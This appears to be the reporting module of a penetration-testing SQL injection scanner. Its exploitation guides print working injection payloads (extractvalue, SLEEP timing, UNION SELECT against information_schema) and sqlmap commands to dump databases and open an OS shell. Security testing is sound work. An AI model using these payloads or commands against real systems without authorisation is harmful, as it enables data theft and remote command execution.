#!/usr/bin/env python3
"""
SQL Injection Scanner Reporter
Handles all output formatting, report generation, and curl command recommendations
"""

import json
import sys
from .databases import DatabaseEnumeration

try:
    from crack.core.themes import Colors
except ImportError:
    # Fallback for standalone execution
    class Colors:
        HEADER = '\033[95m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        BOLD = '\033[1m'
        CYAN = '\033[96m'
        END = '\033[0m'


class SQLiReporter:
    """Handles all reporting and output formatting for SQLi scanner"""

    def __init__(self, target, method, post_params=None):
        self.target = target
        self.method = method
        self.post_params = post_params or {}

    def display_findings(self, param, findings):
        """Display findings for a parameter during scanning"""
        if not findings:
            print(f"  ✗ No SQL injection detected")
            return

        highest_confidence = max(f['confidence'] for f in findings)
        color = Colors.GREEN if highest_confidence >= 80 else Colors.YELLOW

        print(f"{color}  ✓ SQL Injection detected! [Max Confidence: {highest_confidence}%]{Colors.END}")

        for finding in findings:
            if finding['type'] == 'error':
                print(f"    • Error-based: {finding['db_type']} database detected")
                if finding.get('snippet'):
                    print(f"      Error: {finding['snippet']}")
            elif finding['type'] == 'boolean':
                print(f"    • Boolean-based: {finding['description']}")
                print(f"      Difference: {finding['size_diff']} bytes")
            elif finding['type'] == 'time':
                print(f"    • Time-based: {finding['db_type']} - Delay: {finding['delay']:.1f}s")
            elif finding['type'] == 'union':
                print(f"    • UNION-based: {finding['column_count']} columns detected")

    def generate_report(self, vulnerabilities, tested_count, params_tested):
        """Generate final vulnerability report"""
        print(f"\n{Colors.BOLD}[VULNERABILITIES FOUND]{Colors.END}")
        print("=" * 60)

        if not vulnerabilities:
            self._no_vulnerabilities_found(tested_count, params_tested)
            return

        # Sort by confidence
        vulnerabilities.sort(key=lambda x: x['max_confidence'], reverse=True)

        high_conf = [v for v in vulnerabilities if v['max_confidence'] >= 80]
        med_conf = [v for v in vulnerabilities if 50 <= v['max_confidence'] < 80]
        low_conf = [v for v in vulnerabilities if v['max_confidence'] < 50]

        if high_conf:
            print(f"\n{Colors.RED}High Confidence (≥80%):{Colors.END}")
            for vuln in high_conf:
                types = set(f['type'] for f in vuln['findings'])
                print(f"  • {vuln['param']} [{vuln['max_confidence']}%] - Types: {', '.join(types)}")

        if med_conf:
            print(f"\n{Colors.YELLOW}Medium Confidence (50-79%):{Colors.END}")
            for vuln in med_conf:
                types = set(f['type'] for f in vuln['findings'])
                print(f"  • {vuln['param']} [{vuln['max_confidence']}%] - Types: {', '.join(types)}")

        # Exploitation guide for highest confidence finding
        if vulnerabilities:
            self._generate_exploitation_guide(vulnerabilities[0])

        # Summary
        self._generate_summary(vulnerabilities, tested_count, params_tested)

        # Next steps
        self._generate_next_steps(high_conf, med_conf)

    def _no_vulnerabilities_found(self, tested_count, params_tested):
        """Display message when no vulnerabilities found"""
        print(f"{Colors.YELLOW}No SQL injection vulnerabilities detected{Colors.END}")
        print(f"\nTotal tests performed: {tested_count}")

        print(f"\n{Colors.BOLD}[NEXT STEPS]{Colors.END}")
        print("-" * 40)
        print(f"{Colors.BLUE}• EXPAND TESTING:{Colors.END}")
        print(f"  └─ python3 sqli_scanner.py {self.target} --technique all --verbose")
        print(f"     # Try all injection techniques with detailed output")
        print(f"\n  └─ python3 sqli_scanner.py {self.target} -m POST -d 'param1=value1&param2=value2'")
        print(f"     # Test with POST method if currently using GET")
        print(f"\n{Colors.YELLOW}• ALTERNATIVE APPROACHES:{Colors.END}")
        print(f"  └─ sqlmap -u '{self.target}' --batch --risk=3 --level=5")
        print(f"     # Use sqlmap with maximum testing levels")
        print(f"\n  └─ Check for second-order SQL injection in other pages")
        print(f"     # Input might be stored and executed elsewhere")

    def _generate_exploitation_guide(self, best_vuln):
        """Generate exploitation guide for best vulnerability"""
        best_finding = max(best_vuln['findings'], key=lambda x: x['confidence'])
        param = best_vuln['param']

        print(f"\n{Colors.BOLD}[EXPLOITATION GUIDE]{Colors.END}")
        print("=" * 60)
        print(f"Parameter: {param}")
        print(f"Method: {best_finding['type'].capitalize()}-based injection")

        if best_finding['type'] == 'error':
            db_type = best_finding.get('db_type', 'unknown')
            print(f"Database: {db_type}")

            if best_finding.get('snippet'):
                print(f"Detected via: {best_finding['snippet']}")
        elif best_finding['type'] == 'union':
            print(f"Columns: {best_finding.get('column_count', 'unknown')}")

        print(f"\n{Colors.CYAN}Manual Exploitation:{Colors.END}")

        if best_finding['type'] == 'error':
            self._show_error_based_exploitation(param, best_finding.get('db_type', ''))
        elif best_finding['type'] == 'boolean':
            self._show_boolean_based_exploitation(param)
        elif best_finding['type'] == 'time':
            self._show_time_based_exploitation(param)
        elif best_finding['type'] == 'union':
            self._show_union_based_exploitation(param, best_finding.get('column_count', 3))

        # Database-specific curl recommendations
        if best_finding['type'] == 'error' and best_finding.get('db_type'):
            recommendations = DatabaseEnumeration.get_enumeration_steps(
                best_finding['db_type'], param, self.method, self.target, self.post_params
            )
            self.display_curl_recommendations(recommendations)

            # Follow-up enumeration commands
            followup_commands = DatabaseEnumeration.get_followup_commands(
                best_finding['db_type'], param, self.method, self.target, self.post_params
            )
            self.display_followup_commands(followup_commands)

        # Automated exploitation
        self._show_automated_exploitation(param)

    def _show_error_based_exploitation(self, param, db_type):
        """Show error-based exploitation examples"""
        print(f"  1. Extract database version:")
        if 'mysql' in db_type.lower():
            print(f"     {self.target}?{param}=' AND extractvalue(1,concat(0x7e,version()))--")
            print(f"\n  2. Extract database name:")
            print(f"     {self.target}?{param}=' AND extractvalue(1,concat(0x7e,database()))--")
            print(f"\n  3. Extract table names:")
            print(f"     {self.target}?{param}=' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--")
        else:
            print(f"     {self.target}?{param}=' AND 1=CONVERT(int,@@version)--")

    def _show_boolean_based_exploitation(self, param):
        """Show boolean-based exploitation examples"""
        print(f"  1. Test for specific content:")
        print(f"     {self.target}?{param}=' AND (SELECT 'test')='test'--")
        print(f"\n  2. Extract data character by character:")
        print(f"     {self.target}?{param}=' AND SUBSTRING(database(),1,1)='a'--")
        print(f"     # Iterate through characters to extract database name")
        print(f"\n  3. Check table existence:")
        print(f"     {self.target}?{param}=' AND (SELECT COUNT(*) FROM users)>0--")

    def _show_time_based_exploitation(self, param):
        """Show time-based exploitation examples"""
        print(f"  1. Confirm with conditional delay:")
        print(f"     {self.target}?{param}=' AND IF(1=1,SLEEP(5),0)--")
        print(f"\n  2. Extract data via timing:")
        print(f"     {self.target}?{param}=' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--")
        print(f"     # If delay occurs, first character is 'a'")

    def _show_union_based_exploitation(self, param, col_count):
        """Show union-based exploitation examples"""
        union_vals = ','.join([f'{i+1}' for i in range(col_count)])
        print(f"  1. Find visible columns:")
        print(f"     {self.target}?{param}=' UNION SELECT {union_vals}--")
        print(f"     # Look for numbers 1,2,3... in response to identify columns")
        print(f"\n  2. Extract database info:")
        print(f"     {self.target}?{param}=' UNION SELECT database(),user(),version(){''.join([',NULL' for _ in range(col_count-3)])}--")
        print(f"\n  3. Extract table names:")
        print(f"     {self.target}?{param}=' UNION SELECT table_name{',NULL' * (col_count-1)} FROM information_schema.tables--")

    def _show_automated_exploitation(self, param):
        """Show automated exploitation commands"""
        print(f"\n{Colors.CYAN}Automated Exploitation:{Colors.END}")

        if self.method == 'GET':
            print(f"  sqlmap -u '{self.target}' -p {param} --batch --dbs")
        else:
            post_str = '&'.join([f"{k}={v[0] if isinstance(v, list) else v}" for k, v in self.post_params.items()])
            print(f"  sqlmap -u '{self.target}' --data='{post_str}' -p {param} --batch --dbs")

        print(f"\n  # Dump specific database:")
        print(f"  sqlmap -u '...' -p {param} -D database_name --dump")
        print(f"\n  # Get OS shell (if privileges allow):")
        print(f"  sqlmap -u '...' -p {param} --os-shell")

    def display_curl_recommendations(self, recommendations):
        """Display formatted curl recommendations"""
        if not recommendations:
            return

        print(f"\n{Colors.BOLD}[RECOMMENDED CURL COMMANDS]{Colors.END}")
        print("─" * 60)

        for i, rec in enumerate(recommendations, 1):
            print(f"\n{Colors.CYAN}{i}. {rec['title']}{Colors.END}")
            print(f"   {Colors.YELLOW}├─ Command:{Colors.END}")
            for line in rec['curl'].split('\n'):
                print(f"      {Colors.GREEN}{line}{Colors.END}")
            print(f"   {Colors.YELLOW}├─ Purpose:{Colors.END} {rec['purpose']}")
            print(f"   {Colors.YELLOW}└─ What to look for:{Colors.END} {rec['what_to_look_for']}")

            if rec.get('iterate_note'):
                print(f"      {Colors.BLUE}↻ Iterate:{Colors.END} {rec['iterate_note']}")

            if rec.get('requires_input'):
                print(f"      {Colors.RED}⚠ Replace:{Colors.END} {rec['requires_input']} with actual value")

    def display_followup_commands(self, followup_commands):
        """Display categorized follow-up enumeration commands"""
        if not followup_commands:
            return

        print(f"\n{Colors.BOLD}[FOLLOW-UP ENUMERATION COMMANDS]{Colors.END}")
        print("═" * 60)
        print(f"{Colors.YELLOW}Advanced enumeration after initial vulnerability confirmation{Colors.END}")
        print("─" * 60)

        for category, commands in followup_commands.items():
            print(f"\n{Colors.CYAN}▶ {category}{Colors.END}")
            print("  " + "─" * 56)

            for i, cmd in enumerate(commands, 1):
                # Title and description
                print(f"\n  {Colors.BOLD}{i}. {cmd['title']}{Colors.END}")
                print(f"     {Colors.BLUE}Purpose:{Colors.END} {cmd['description']}")

                # Curl command
                print(f"     {Colors.YELLOW}Command:{Colors.END}")
                # Handle multi-line curl commands
                for line in cmd['curl'].split('\n'):
                    print(f"       {Colors.GREEN}{line}{Colors.END}")

                # What to look for
                print(f"     {Colors.YELLOW}Look for:{Colors.END} {cmd['look_for']}")

                # Input requirements
                if cmd.get('requires_input'):
                    print(f"     {Colors.RED}⚠ Replace:{Colors.END} {cmd['requires_input']} with discovered value")

    def _generate_summary(self, vulnerabilities, tested_count, params_tested):
        """Generate summary statistics"""
        print(f"\n{Colors.BOLD}[SUMMARY]{Colors.END}")
        print("-" * 40)
        print(f"Total parameters tested: {len(params_tested)}")
        print(f"Total tests performed: {tested_count}")
        print(f"Vulnerable parameters: {len(vulnerabilities)}")

        if vulnerabilities:
            print(f"Highest confidence: {vulnerabilities[0]['max_confidence']}%")

    def _generate_next_steps(self, high_conf, med_conf):
        """Generate next steps recommendations"""
        print(f"\n{Colors.BOLD}[NEXT STEPS]{Colors.END}")
        print("-" * 40)

        if high_conf:
            print(f"{Colors.RED}• EXPLOIT IMMEDIATELY:{Colors.END}")
            for vuln in high_conf[:2]:
                param = vuln['param']
                finding_types = set(f['type'] for f in vuln['findings'])

                if 'union' in finding_types:
                    print(f"  └─ sqlmap -u '{self.target}' -p {param} --technique=U --dump")
                    print(f"     # UNION-based extraction is fastest and most reliable")
                elif 'error' in finding_types:
                    print(f"  └─ sqlmap -u '{self.target}' -p {param} --technique=E --dbs")
                    print(f"     # Error-based extraction for database enumeration")
                elif 'boolean' in finding_types:
                    print(f"  └─ sqlmap -u '{self.target}' -p {param} --technique=B --threads=10")
                    print(f"     # Boolean-based with multiple threads for speed")
                elif 'time' in finding_types:
                    print(f"  └─ sqlmap -u '{self.target}' -p {param} --technique=T --time-sec=3")
                    print(f"     # Time-based (slowest but stealthiest)")

        elif med_conf:
            print(f"{Colors.YELLOW}• INVESTIGATE FURTHER:{Colors.END}")
            print(f"  └─ python3 sqli_scanner.py {self.target} --technique all --verbose")
            print(f"     # Run all techniques with verbose output")
            print(f"  └─ Manually verify with targeted payloads")
            print(f"     # Sometimes automated tools miss context-specific injections")

        else:
            print(f"{Colors.GREEN}• EXPAND ENUMERATION:{Colors.END}")
            print(f"  └─ Try different parameter values or encodings")
            print(f"  └─ Test for second-order SQL injection")
            print(f"  └─ Check for NoSQL injection if backend might be MongoDB/etc")

    def export_results(self, output_file, vulnerabilities, tested_count):
        """Export results to JSON file"""
        try:
            with open(output_file, 'w') as f:
                json.dump({
                    'target': self.target,
                    'method': self.method,
                    'vulnerabilities': vulnerabilities,
                    'total_tests': tested_count
                }, f, indent=2)
            print(f"\n{Colors.GREEN}[+] Results saved to {output_file}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to save results: {e}{Colors.END}")